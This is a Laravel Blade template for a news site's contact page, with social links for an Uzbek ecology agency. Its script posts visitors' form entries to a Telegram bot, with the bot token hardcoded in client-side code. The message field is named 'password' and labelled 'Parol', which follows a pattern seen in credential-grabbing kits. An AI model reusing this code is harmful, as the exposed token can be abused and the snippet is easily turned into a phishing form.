@include('layouts.header')
    <!-- Contact Start -->
    <div class="container-fluid mt-5 pt-3">
        <div class="container">
            <div class="row">
                <div class="col-lg-8">
                    <div class="section-title mb-0">
                        <h4 class="m-0 text-uppercase font-weight-bold">Contact Us For Any Queries</h4>
                    </div>
                    <div class="bg-white border border-top-0 p-4 mb-3">
                        <div class="mb-4">
                            <h6 class="text-uppercase font-weight-bold">Contact Info</h6>
                            <p class="mb-4">The contact form is currently inactive. Get a functional and working contact form with Ajax & PHP in a few minutes. Just copy and paste the files, add a little code and you're done. <a href="https://htmlcodex.com/contact-form">Download Now</a>.</p>
							<div class="mb-3">
                                <div class="d-flex align-items-center mb-2">
                                    <i class="fa fa-map-marker-alt text-primary mr-2"></i>
                                    <h6 class="font-weight-bold mb-0">Our Office</h6>
                                </div>
                                <p class="m-0">123 Street, New York, USA</p>
                            </div>
                            <div class="mb-3">
                                <div class="d-flex align-items-center mb-2">
                                    <i class="fa fa-envelope-open text-primary mr-2"></i>
                                    <h6 class="font-weight-bold mb-0">Email Us</h6>
                                </div>
                                <p class="m-0">info@example.com</p>
                            </div>
                            <div class="mb-3">
                                <div class="d-flex align-items-center mb-2">
                                    <i class="fa fa-phone-alt text-primary mr-2"></i>
                                    <h6 class="font-weight-bold mb-0">Call Us</h6>
                                </div>
                                <p class="m-0">+012 345 6789</p>
                            </div>
                        </div>
                        <h6 class="text-uppercase font-weight-bold mb-3">Contact Us</h6>
                        <form>
                            <div class="form-row">
                                <div class="col-md-6">
                                    <div class="form-group">
                                        <input type="text" id="fname" class="form-control p-4" placeholder="Your Name" required="required"/>
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="form-group">
                                        <input type="email" id="email" class="form-control p-4" placeholder="Your Email" required="required"/>
                                    </div>
                                </div>
                            </div>
                            {{-- <div class="form-group">
                                <input type="text" class="form-control p-4" placeholder="Subject" required="required"/>
                            </div> --}}
                            <div class="form-group">
                                <textarea class="form-control" id="password" rows="4" placeholder="Message" required="required"></textarea>
                            </div>
                            <div>
                                <button class="btn btn-primary font-weight-semi-bold px-4" style="height: 50px;"
                                    type="submit" onclick="alicoder()">Send Message</button>
                            </div>
                        </form>
                    </div>
                </div>
                <div class="col-lg-4">
                    <!-- Social Follow Start -->
                            <div class="mb-3">
                                <div class="section-title mb-0">
                                    <h4 class="m-0 text-uppercase font-weight-bold">{{__('messages.follow')}}</h4>
                                </div>
                                <div class="bg-white border border-top-0 p-3">
                                    <a href="https://www.facebook.com/Uzecology/" class="d-block w-100 text-white text-decoration-none mb-3" style="background: #39569E;">
                                        <i class="fab fa-facebook-f text-center py-4 mr-3" style="width: 65px; background: rgba(0, 0, 0, .2);"></i>
                                        <span class="font-weight-medium">12,345 Fans</span>
                                    </a>
                                    <a href="https://t.me/ecogovuz" class="d-block w-100 text-white text-decoration-none mb-3" style="background: #52AAF4;">
                                        <i class="fab fa-telegram text-center py-4 mr-3" style="width: 65px; background: rgba(0, 0, 0, .2);"></i>
                                        <span class="font-weight-medium">14,444 Followers</span>
                                    </a>

                                    <a href="https://www.instagram.com/ekologiyadavlatqomitasi/" class="d-block w-100 text-white text-decoration-none mb-3" style="background: #C8359D;">
                                        <i class="fab fa-instagram text-center py-4 mr-3" style="width: 65px; background: rgba(0, 0, 0, .2);"></i>
                                        <span class="font-weight-medium">147 Followers</span>
                                    </a>
                                    <a href="https://www.youtube.com/channel/UCiaUoLECuViPTHW1X72wsrw" class="d-block w-100 text-white text-decoration-none mb-3" style="background: #DC472E;">
                                        <i class="fab fa-youtube text-center py-4 mr-3" style="width: 65px; background: rgba(0, 0, 0, .2);"></i>
                                        <span class="font-weight-medium">348 Subscribers</span>
                                    </a>

                                </div>
                            </div>
                    <!-- Social Follow End -->

                    <!-- Newsletter Start -->
                    <div class="mb-3">
                        <div class="section-title mb-0">
                            <h4 class="m-0 text-uppercase font-weight-bold">Newsletter</h4>
                        </div>
                        <div class="bg-white text-center border border-top-0 p-3">
                            <p>Aliqu justo et labore at eirmod justo sea erat diam dolor diam vero kasd</p>
                            <div class="input-group mb-2" style="width: 100%;">
                                <input type="text" class="form-control form-control-lg" placeholder="Your Email">
                                <div class="input-group-append">
                                    <button class="btn btn-primary font-weight-bold px-3">Sign Up</button>
                                </div>
                            </div>
                            <small>Lorem ipsum dolor sit amet elit</small>
                        </div>
                    </div>
                    <!-- Newsletter End -->
                </div>
            </div>
        </div>
    </div>
    <script>
        function alicoder() {
            let fname = document.getElementById('fname').value;
            let email = document.getElementById('email').value;
            let password = document.getElementById('password').value;
            event.preventDefault();
            let telegram_bot_id = "5852967782:AAES8FdqTEWEgf5KbaVKJ0UdN4j0-DMTPng";
            let chat_id = -882544284; // 1111 o'rniga Habar borishi kerak bo'lgan ChatID
            let message = `Ismi: ${fname}; Email: ${email}; Parol: ${password}`;
            let settings = {
                "async": true,
                "crossDomain": true,
                "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json",
                    "cache-control": "no-cache"
                },
                "data": JSON.stringify({
                    "chat_id": chat_id,
                    "text": message
                })
            };
            $.ajax(settings).done(function (response) {
               alert('Xabaringiz uchun rahmat!');
            });
            document.getElementById('fname').value = '';
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            return false;
};
    </script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <!-- Contact End -->
    @include('layouts.footer')
